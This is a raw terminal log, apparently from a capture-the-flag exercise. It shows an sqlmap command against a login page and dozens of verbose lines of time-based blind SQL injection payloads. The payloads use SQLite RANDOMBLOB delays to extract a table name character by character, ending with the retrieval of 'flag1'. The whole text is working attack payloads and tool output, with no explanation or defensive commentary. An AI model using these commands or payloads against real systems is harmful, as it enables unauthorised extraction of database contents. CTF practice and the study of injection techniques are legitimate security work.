$ sqlmap -u 'http://ctf.adl.tw:12004/login.php' --data 'ctf_username=*+&ctf_password=asdasd' --level 5 --risk 3 --technique T --dbms sqlite --tables -v 3

[11:38:23] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),1,1)='u') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))) ELSE 3112 END)-- rHtY
[11:38:23] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[11:38:23] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[11:38:23] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),1,1)>'A') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))) ELSE 3112 END)-- rHtY
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
[11:40:05] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),1,1)>'`') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))) ELSE 3112 END)-- rHtY
[11:40:05] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[11:40:33] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),1,1)>'p') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))) ELSE 3112 END)-- rHtY
[11:40:33] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),1,1)>'h') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))) ELSE 3112 END)-- rHtY
[11:40:34] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),1,1)>'d') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))) ELSE 3112 END)-- rHtY
[11:41:00] [INFO] adjusting time delay to 3 seconds due to good response times
[11:41:00] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),1,1)>'f') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:01] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),1,1)>'e') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:05] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),1,1)!='f') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:06] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),2,1)>'`') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:10] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),2,1)>'p') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:10] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),2,1)>'h') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:15] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),2,1)>'l') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:15] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),2,1)>'j') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:20] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),2,1)>'k') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:24] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),2,1)!='l') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:24] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),3,1)>'`') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:29] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),3,1)>'p') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:29] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),3,1)>'h') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:29] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),3,1)>'d') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:29] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),3,1)>'b') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:29] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),3,1)>'a') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:29] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),3,1)!='a') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:29] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),4,1)>'`') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:34] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),4,1)>'p') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:34] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),4,1)>'h') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:34] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),4,1)>'d') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:39] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),4,1)>'f') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:43] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),4,1)>'g') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:43] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),4,1)!='g') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:43] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),5,1)>'`') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:43] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),5,1)>'1') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:43] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),5,1)>'\x01') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:48] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),5,1)>'\x1a') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:52] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),5,1)>'%') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:41:57] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),5,1)>'+') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:42:01] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),5,1)>'.') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:42:06] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),5,1)>'/') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:42:11] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),5,1)>'0') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:42:15] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),5,1)!='1') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:42:15] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),6,1)>'/') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:42:15] [PAYLOAD] a' OR 3112=(CASE WHEN (SUBSTR((SELECT COALESCE(tbl_name,' ') FROM sqlite_master WHERE type='table' LIMIT 2,1),6,1)>'\x01') THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))) ELSE 3112 END)-- rHtY
[11:42:15] [INFO] retrieved: flag1